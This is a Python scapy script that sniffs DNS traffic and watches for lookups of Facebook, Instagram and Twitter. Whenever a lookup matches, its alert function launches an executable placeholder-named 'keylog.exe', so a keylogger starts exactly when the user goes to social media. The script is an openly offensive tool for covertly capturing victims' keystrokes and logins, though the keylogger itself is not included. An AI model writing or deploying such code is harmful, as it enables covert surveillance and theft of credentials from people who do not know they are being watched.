from scapy.all import *
import logging
import re

class DNSMonitor:
    def __init__(self, target_domains, trigger_function):
        self.target_domains = self.process_domains(target_domains)
        self.trigger_function = trigger_function
        self.setup_logging()
        
    def process_domains(self, domains):
        #regex patterns --> subdomain
        patterns = []
        for domain in domains:
            domain = domain.lower().strip()
            pattern = re.compile(f'(^|\.){re.escape(domain)}$')
            patterns.append(pattern)
        return patterns
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
    
    def matches_target(self, query):

        query = query.rstrip('.').lower()
        for pattern in self.target_domains:
            if pattern.search(query):
                return True
        return False
    
    def packet_callback(self, packet):
        if packet.haslayer(DNS):
            dns = packet.getlayer(DNS)
            #queries
            if dns.qr == 0 and dns.qd:
                query = dns.qd.qname.decode('utf-8')
                if self.matches_target(query):
                    logging.info(f"Detected DNS query for {query}")
                    self.trigger_function(query, packet, "query")
            
            #responses
            elif dns.qr == 1 and dns.an:
                for i in range(dns.ancount):
                    if dns.an[i].type == 1:
                        name = dns.an[i].rrname.decode('utf-8')
                        ip = dns.an[i].rdata
                        if self.matches_target(name):
                            logging.info(f"Detected DNS response: {name} -> {ip}")
                            self.trigger_function(name, packet, "response")
    
    def start(self):
        try:
            logging.info("Starting enhanced DNS monitor...")
            sniff(filter="udp port 53", prn=self.packet_callback, store=0)
        except KeyboardInterrupt:
            logging.info("Stopping DNS monitor...")
        except Exception as e:
            logging.error(f"Error in DNS monitor: {e}")


def alert_function(domain, packet, event_type):
    try:
        
        path = "Your Executable file keylog.exe"
        result = subprocess.run([path], shell=True, check=True)
        
        if result.returncode == 0:
            logging.info(f"Program completed successfully for {domain}")
        else:
            logging.warning(f"Program exited with code {result.returncode} for {domain}")
            
    except subprocess.CalledProcessError as e:
        logging.error(f"Program failed with code {e.returncode}")
    except Exception as e:
        logging.error(f"Error running program: {e}")


domains_to_monitor = [
    "facebook.com",
    "instagram.com",
    "twitter.com"
]

monitor = DNSMonitor(domains_to_monitor, alert_function)
monitor.start()